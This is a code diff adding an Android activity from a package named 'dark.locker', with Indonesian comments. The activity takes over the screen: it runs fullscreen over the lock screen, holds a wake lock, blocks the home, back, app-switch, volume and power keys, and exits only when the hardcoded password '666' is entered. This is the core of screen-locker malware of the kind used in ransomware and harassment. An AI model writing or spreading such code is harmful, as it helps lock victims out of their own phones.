@@ -1,0 +1,111 @@
+package org.dark.locker;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.os.PowerManager;
+import android.view.KeyEvent;
+import android.view.View;
+import android.view.WindowManager;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+import android.os.Vibrator;
+import android.content.Context;
+import android.content.Intent;
+import android.provider.Settings;
+
+public class MainActivity extends Activity {
+    private EditText passwordInput;
+    private TextView statusText;
+    private int attempts = 0;
+    private PowerManager.WakeLock wakeLock;
+    
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        
+        // Fullscreen dan selalu di atas
+        getWindow().setFlags(
+            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
+            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+        );
+        
+        // Wake lock untuk tetap aktif
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        wakeLock = pm.newWakeLock(
+            PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
+            PowerManager.ACQUIRE_CAUSES_WAKEUP |
+            PowerManager.ON_AFTER_RELEASE,
+            "Locker:WakeLock"
+        );
+        wakeLock.acquire();
+        
+        // Inisialisasi view
+        passwordInput = findViewById(R.id.passwordInput);
+        statusText = findViewById(R.id.statusText);
+        Button unlockBtn = findViewById(R.id.unlockBtn);
+        
+        unlockBtn.setOnClickListener(v -> checkPassword());
+        passwordInput.setOnEditorActionListener((v, actionId, event) -> {
+            checkPassword();
+            return true;
+        });
+    }
+    
+    private void checkPassword() {
+        String pw = passwordInput.getText().toString().trim();
+        if (pw.equals("666")) {
+            statusText.setText("✅ UNLOCK BERHASIL!");
+            statusText.setTextColor(0xFF00FF00);
+            // Exit app
+            finishAndRemoveTask();
+            System.exit(0);
+        } else {
+            attempts++;
+            statusText.setText("❌ SALAH! (" + attempts + ")");
+            statusText.setTextColor(0xFFFF0000);
+            passwordInput.setText("");
+            passwordInput.requestFocus();
+            
+            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+            v.vibrate(300);
+        }
+    }
+    
+    @Override
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        // Blokir semua tombol: HOME, BACK, RECENT, VOLUME, POWER
+        if (keyCode == KeyEvent.KEYCODE_HOME ||
+            keyCode == KeyEvent.KEYCODE_BACK ||
+            keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
+            keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
+            keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
+            keyCode == KeyEvent.KEYCODE_POWER) {
+            return true;
+        }
+        return super.onKeyDown(keyCode, event);
+    }
+    
+    @Override
+    public void onBackPressed() {
+        // Tidak boleh back
+        return;
+    }
+    
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
+    }
+}
